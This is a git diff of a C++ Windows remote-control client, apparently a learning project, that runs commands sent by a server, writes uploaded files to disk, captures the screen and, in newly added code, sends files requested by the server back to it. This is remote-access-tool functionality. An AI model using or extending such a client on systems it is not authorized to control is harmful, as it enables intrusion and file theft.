@@ -57,15 +57,15 @@ DWORD WINAPI RecvPacket(LPVOID lpThreadParameter) {
 		return 1;
 	}
 
-	// 创建心跳线程
-	hSendHeartBeat = CreateThread(
-		NULL, 0, (LPTHREAD_START_ROUTINE)SendHeartBeat, (LPVOID)s, 0, NULL
-	);
+	//// 创建心跳线程
+	//hSendHeartBeat = CreateThread(
+	//	NULL, 0, (LPTHREAD_START_ROUTINE)SendHeartBeat, (LPVOID)s, 0, NULL
+	//);
 
-	if (hSendHeartBeat == NULL) {
-		wprintf(L"Create thread error %d\n", GetLastError());
-		return 1;
-	}
+	//if (hSendHeartBeat == NULL) {
+	//	wprintf(L"Create thread error %d\n", GetLastError());
+	//	return 1;
+	//}
 
 	// 主线程：接收指令
 	UINT32 command = 0;
@@ -87,6 +87,7 @@ DWORD WINAPI RecvPacket(LPVOID lpThreadParameter) {
 			memset(cmd, 0, CMDSIZE);
 			wprintf(L"Wait For Recv Command\n");
 			if (!s->RecvCommand(cmd, Bytebuf)) {
+				wprintf(L"Recv Command Error %d\n", WSAGetLastError());
 				break;
 			}
 			wprintf(L"%s\n", cmd);
@@ -94,6 +95,7 @@ DWORD WINAPI RecvPacket(LPVOID lpThreadParameter) {
 			PipeCmd(cmd, sendbuf, 1);
 			// 发送sendbuf
 			if (!s->SendResult(sendbuf, Bytebuf)) {
+				wprintf(L"Send Cmd Res Error %d\n", WSAGetLastError());
 				break;
 			}
 			break;
@@ -101,12 +103,13 @@ DWORD WINAPI RecvPacket(LPVOID lpThreadParameter) {
 		case UPLOAD: {
 			UINT32 FileLen = 0;
 			wchar_t* Path = new wchar_t[FILE_PATH_LEN];
-			ZeroMemory(Path, FILE_PATH_LEN);
+			ZeroMemory(Path, FILE_PATH_LEN * sizeof(wchar_t));
 
 			wprintf(L"Recv Server File Path\n");
 			// 先接收文件路径
 
 			if (!s->RecvCommand(Path, Bytebuf)) {
+				wprintf(L"Recv Server File Path error %d\n", WSAGetLastError());
 				break;
 			}
 
@@ -117,12 +120,12 @@ DWORD WINAPI RecvPacket(LPVOID lpThreadParameter) {
 			wprintf(L"Recv Server File\n");
 			// 接收文件
 			if (!s->RecvFile(FileBuf, FILEBUFFERLEN)) {
-				wprintf(L"Recv Command error\n");
+				wprintf(L"Recv File error %d\n", WSAGetLastError());
 				return false;
 			}
 			// 写入文件
 			if (!s->WriteToFile(FileBuf, Path)) {
-				wprintf(L"Recv File Error\n");
+				wprintf(L"Recv File Error %d\n", WSAGetLastError());
 				return false;
 			}
 
@@ -131,7 +134,39 @@ DWORD WINAPI RecvPacket(LPVOID lpThreadParameter) {
 			break;
 		}
 		case DOWNLOAD: {
+			UINT32 FileLen = 0;
+			wchar_t* Path = new wchar_t[FILE_PATH_LEN];
+			ZeroMemory(Path, FILE_PATH_LEN * sizeof(wchar_t));
 
+			// 先接收文件路径
+			if (!s->RecvCommand(Path, Bytebuf)) {
+				wprintf(L"Recv Server File Path error %d\n", WSAGetLastError());
+				break;
+			}
+
+			wprintf(L"Recv Server File Path\n");
+			// 打开文件并写入缓冲区
+			int ret = s->ReadFromFile(Path, &FileLen, &FileBuf);
+			// 发送ReadFromFile的返回值
+			if (!s->SendCommand(ret)) {
+				wprintf(L"Send Command Error %d\n", WSAGetLastError());
+				return false;
+			}
+
+			if (ret == 1) {
+				wprintf(L"Open File Error %d\n", GetLastError());
+				break;
+			}
+			else if (ret == 2){
+				wprintf(L"Read From File Error %d\n", GetLastError());
+				break;
+			}
+			// 发送文件到server
+			if (!s->SendFile(FileBuf, FileLen)) {
+				wprintf(L"Send File Error %d\n", WSAGetLastError());
+				return false;
+			}
+			wprintf(L"Send File To Server Success\n");
 			break;
 		}
 		case SCREENSHOT: {
